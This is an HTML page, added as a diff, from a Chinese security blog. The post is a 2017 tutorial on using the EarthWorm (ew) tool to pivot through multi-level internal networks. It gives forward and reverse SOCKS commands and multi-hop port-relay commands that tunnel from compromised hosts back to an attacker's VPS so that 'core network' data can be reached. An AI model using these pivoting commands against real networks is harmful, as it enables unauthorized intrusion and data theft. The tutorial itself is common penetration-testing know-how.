@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="利用 ew 轻松穿透目标多级内网"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>利用 ew 轻松穿透目标多级内网 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/08/05/ew-tunnel/">
+                利用 ew 轻松穿透目标多级内网
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-08-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ew/">ew</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 ew 快速穿透目标多级内网:</p>
+<p>简要环境说明:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win2008R2</span> 假设为目标边界<span class="selector-tag">web</span>服务器,可正常访问公网</div><div class="line">假设其公网<span class="selector-tag">ip</span>为 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div><div class="line">假设其内网<span class="selector-tag">ip</span>为 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.131</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win2008</span> 假设为目标内网数据库服务器,可正常访问公网</div><div class="line">假设其内网<span class="selector-tag">ip</span>为 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.170</span></div></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win7</span> 假设为自己公网的<span class="selector-tag">vps</span></div><div class="line">假设其公网<span class="selector-tag">ip</span>为 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.232</span></div></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">centos</span> 5<span class="selector-class">.1</span> 假设为目标内网的一台<span class="selector-tag">linux</span>机器,没有<span class="selector-tag">dns</span>不能访问公网</div><div class="line">假设其内网<span class="selector-tag">ip</span>为 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.169</span></div></pre></td></tr></table></figure>
+<p>0x02 首先,利用ew做最简单的正向代理,其实就是大家最常用的所谓的ss:</p>
+<p>在 win2008R2 机器上执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ew_for_Win.exe -s ssocksd -l 1080</span></div></pre></td></tr></table></figure></p>
+<p>在win7上打开Proxifier根据上面监听的端口建立正常的socks代理即可<br><a id="more"></a></p>
+<p>0x03 假设目标机器就直接处在内网[没有公网ip,但可以访问公网],我们也可以利用ew进行反向socks5代理,然后直接在vps上就可以很方便的访问目标内网中的所有机器了:</p>
+<p>先在 win7上执行,等待目标反弹连接<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s rcsocks -l <span class="number">1080</span> -e <span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p>在 win2008上执行,反弹socks5连接<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">ew_for_Win</span><span class="selector-class">.exe</span> <span class="selector-tag">-s</span>  <span class="selector-tag">rssocks</span> <span class="selector-tag">-d</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.232</span> <span class="selector-tag">-e</span> 1234</div></pre></td></tr></table></figure></p>
+<p>0x04 实现复杂内网环境下的跨网段多级穿透:</p>
+<p>第一种场景,内网机器不能访问公网,可通过能访问公网的机器把内网不能访问公网机器带出来,比较简单,如下:<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">假设wi<span class="symbol">n2008</span>处在目标内网且不能访问公网但可以访问内网中的资源</div><div class="line">而wi<span class="symbol">n2008</span>R<span class="number">2</span>这台机器上虽然有内网ip,但不能访问内网资源,好在wi<span class="symbol">n2008</span>R<span class="number">2</span>可以访问wi<span class="symbol">n2008</span></div><div class="line">这时我们想获取内网资源就可以这样干,先在wi<span class="symbol">n2008</span>上开启socks代理服务,然后再在DMZ的wi<span class="symbol">n2008</span>R<span class="number">2</span>连上内网的wi<span class="symbol">n2008</span>的socks服务</div><div class="line">最后,通过wi<span class="symbol">n2008</span>上的socks服务我们就可以轻松访问目标内网中的各种资源了,具体实现过程如下</div></pre></td></tr></table></figure></p>
+<p>首先,在win2008上执行,意思就是在本地建立socks5代理,端口为1080<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ew_for_Win.exe -s ssocksd -l 1080</span></div></pre></td></tr></table></figure></p>
+<p>在到DMZ的win2008R2上执行,意思就是把来自外部的1090端口的流量转到内网192.168.32.170这台机器的1080端口上<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s lcx_tran -l <span class="number">1090</span> -f <span class="number">192.168</span><span class="number">.32</span><span class="number">.170</span> -g <span class="number">1080</span></div></pre></td></tr></table></figure></p>
+<p>最后,再回到win7[vps]上去利用Proxifier建立正常的socks代理访问1090端口即可,访问vps的1090就相当于访问内网win2008的1080端口</p>
+<p>第二种场景,还是有些机器不能访问公网的情况:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">假设<span class="selector-tag">win2008</span>在内网且能访问公网但不能访问内网资源,而<span class="selector-tag">centos</span> 5<span class="selector-class">.1</span>能访问内网资源但却无法访问公网,而<span class="selector-tag">win2008</span>可以访问<span class="selector-tag">centos</span> 5<span class="selector-class">.1</span></div><div class="line">这试,我们要想获取内网资源,就可以通过<span class="selector-tag">win2008</span>在<span class="selector-tag">centos</span> 5<span class="selector-class">.1</span>和<span class="selector-tag">win7</span><span class="selector-attr">[vps]</span>之间建立一条<span class="selector-tag">socks5</span>通道,实现过程比较简单,如下</div></pre></td></tr></table></figure></p>
+<p>首先,在win7[实际中的vps]上执行,把来自外部的1080端口的流量转到本地的1379端口上<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s lcx_listen -l <span class="number">1080</span> -e <span class="number">1379</span></div></pre></td></tr></table></figure></p>
+<p>此时回到centos 5.1上执行,在本地启动socks5代理并监听2345端口<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> chmod +x ew_for_Linux32</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./ew_for_Linux32 -s ssocksd -l 2345</span></div></pre></td></tr></table></figure></p>
+<p>然后再到win2008上去执行,意思就是把win7[vps]的1379端口和centos 5.1的2345进行绑定,即建立socks5通道<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s lcx_slave -d <span class="number">192.168</span><span class="number">.3</span><span class="number">.232</span> -e <span class="number">1379</span> -f <span class="number">192.168</span><span class="number">.32</span><span class="number">.169</span> -g <span class="number">2345</span></div></pre></td></tr></table></figure></p>
+<p>最后,在回到win7[vps]建立正常的socks代理访问即可,实际上就相当于访问win7的1080就相当于访问centos 5.1的2345端口,通过这种方式一样也可以把整个目标内网代理出来</p>
+<p>第三种场景,多级内网轻松穿透:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">假设<span class="selector-tag">win2008R2</span>在内网<span class="selector-attr">[无公网ip]</span>并在一个独立的内网段,<span class="selector-tag">win2008</span>也处在目标内网,假设在另一个内网段,<span class="selector-tag">centos</span> 5<span class="selector-class">.1</span>同样也处在内网,可又在另一个单独的内网段</div><div class="line">且<span class="selector-tag">win2008R2</span>能访问<span class="selector-tag">win2008</span>,<span class="selector-tag">win2008</span>能访问<span class="selector-tag">centos</span> 5<span class="selector-class">.1</span>,而<span class="selector-tag">centos</span> 5<span class="selector-class">.1</span>能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样</div></pre></td></tr></table></figure></p>
+<p>先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s rcsocks -l <span class="number">1080</span> -e <span class="number">1235</span></div></pre></td></tr></table></figure></p>
+<p>在win2008R2上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s lcx_slave -d <span class="number">192.168</span><span class="number">.3</span><span class="number">.232</span> -e <span class="number">1235</span> -f <span class="number">192.168</span><span class="number">.32</span><span class="number">.170</span> -g <span class="number">3456</span></div></pre></td></tr></table></figure></p>
+<p>在win2008上执行,将来自外部的1236端口和本地的3456端口进行绑定<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s lcx_listen -l <span class="number">3456</span> -e <span class="number">1236</span></div></pre></td></tr></table></figure></p>
+<p>在centos 5.1上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./ew_for_Linux32 -s rssocks -d <span class="number">192.168</span><span class="number">.32</span><span class="number">.170</span> -e <span class="number">1236</span></div></pre></td></tr></table></figure></p>
+<p>最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据</p>
+<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于ew,想必经常搞内网的朋友,都已经非常熟练了,这里也就不废话了,其实,关于ew本身在实战中还是比较实用的,在此也非常感谢作者的无私贡献,真心希望国内能多一些这样的人,总体来讲,在工具使用上并没有太多技术含量,关键还是要你自己根据目标的实际内网环境仔细弄清楚数据流向再针对性的用,上面一些简单应用场景中,表面看着貌似挺复杂的,其实真正理解以后,都非常简单,深刻搞清楚这些最基本的东西你才有可能灵活应用,什么都是如此,总是停留在’用’别人的工具上,自己没有一点儿的独立分析和想法,是很难有长进的,后续有空会再简单介绍下关于Termite跳板机使用</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ew/">#ew</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
